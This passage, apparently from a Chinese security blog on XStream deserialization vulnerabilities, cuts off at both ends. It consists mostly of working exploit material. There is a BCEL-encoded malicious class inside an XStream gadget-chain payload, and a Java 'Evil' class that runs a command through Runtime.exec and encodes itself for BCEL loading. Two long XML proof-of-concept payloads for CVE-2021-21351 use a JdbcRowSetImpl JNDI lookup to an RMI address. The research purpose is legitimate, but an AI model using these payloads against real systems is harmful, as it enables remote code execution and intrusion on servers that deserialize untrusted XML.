class="name">string</span>&gt;</span>$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.bcel.internal.util.ClassLoader'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">parent</span> <span class="attr">class</span>=<span class="string">'sun.misc.Launcher$ExtClassLoader'</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">'hashtable'</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span> <span class="attr">defined-in</span>=<span class="string">'java.lang.ClassLoader'</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.bcel.internal.util.ClassLoader'</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">'../..'</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">packages</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">nativeLibraries</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">assertionLock</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.bcel.internal.util.ClassLoader'</span> <span class="attr">reference</span>=<span class="string">'..'</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultAssertionStatus</span>&gt;</span>false<span class="tag">&lt;/<span class="name">defaultAssertionStatus</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>sun.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">repository</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.bcel.internal.util.SyntheticRepository'</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">paths</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class__path</span>&gt;</span>.<span class="tag">&lt;/<span class="name">class__path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">__path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">__loadedClasses</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">deferTo</span> <span class="attr">class</span>=<span class="string">'sun.misc.Launcher$ExtClassLoader'</span> <span class="attr">reference</span>=<span class="string">'../parent'</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">'java.io.ByteArrayInputStream'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">'../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>复现：</p><p>按照三梦师傅的Payload生成代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> threedr3am</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open -a calculator"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        InputStream inputStream = Evil.class.getResourceAsStream("Evil.class");</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[inputStream.available()];</span><br><span class="line">        inputStream.read(bytes);</span><br><span class="line">        String code = Utility.encode(bytes, <span class="keyword">true</span>);</span><br><span class="line">        String bcel = <span class="string">"$$BCEL$$"</span> + code;</span><br><span class="line">        System.out.println(bcel);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试：</p><p>加载恶意Class的Classloader不再使用URLClassloader去远程加载，而是采用了com.sun.org.apache.bcel.internal.util.ClassLoader，使用了BCEL的方式来进行恶意代码执行。</p><h1 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE_2021_21351"></a>CVE_2021_21351</h1><h2 id="漏洞成因-8"><a href="#漏洞成因-8" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>JdbcRowSetImpl攻击</p><h2 id="高版本"><a href="#高版本" class="headerlink" title="高版本"></a>高版本</h2><h3 id="PoC-8"><a href="#PoC-8" class="headerlink" title="PoC"></a>PoC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xpath.internal.objects.XRTreeFrag'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtm</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__size</span>&gt;</span>-10086<span class="tag">&lt;/<span class="name">m__size</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">__overrideDefaultParser</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__overrideDefaultParser</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__incremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__incremental</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__source__location</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__source__location</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__defaultHandler</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__shouldStripWS</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__shouldStripWS</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__indexing</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__indexing</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__incrementalSAXSource</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fPullParserConfig</span> <span class="attr">class</span>=<span class="string">'com.sun.rowset.JdbcRowSetImpl'</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">listeners</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fPullParserConfig</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">name</span>&gt;</span>setAutoCommit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">class</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigParse</span> <span class="attr">reference</span>=<span class="string">'../fConfigSetInput'</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fParseInProgress</span>&gt;</span>false<span class="tag">&lt;/<span class="name">fParseInProgress</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__incrementalSAXSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__walker</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nextIsRaw</span>&gt;</span>false<span class="tag">&lt;/<span class="name">nextIsRaw</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__walker</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__endDocumentOccured</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__endDocumentOccured</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__idAttributes</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__textPendingStart</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">m__textPendingStart</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__useSourceLocationProperty</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__useSourceLocationProperty</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__pastFirstElement</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__pastFirstElement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">m__dtm</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtmIdentity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmIdentity</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__dtmRoot</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmRoot</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__allowRelease</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__allowRelease</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xpath.internal.objects.XString'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">'string'</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="低版本"><a href="#低版本" class="headerlink" title="低版本"></a>低版本</h2><h3 id="PoC-9"><a href="#PoC-9" class="headerlink" title="PoC"></a>PoC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xpath.internal.objects.XRTreeFrag'</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtm</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__size</span>&gt;</span>-10086<span class="tag">&lt;/<span class="name">m__size</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">__useServicesMechanism</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__useServicesMechanism</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__incremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__incremental</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__source__location</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__source__location</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__defaultHandler</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__shouldStripWS</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__shouldStripWS</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__indexing</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__indexing</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__incrementalSAXSource</span> <span class="attr">class</span>=<span class="string">'com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fPullParserConfig</span> <span class="attr">class</span>=<span class="string">'com.sun.rowset.JdbcRowSetImpl'</span> <span class="attr">serialization</span>=<span class="string">'custom'</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">listeners</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fPullParserConfig</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span 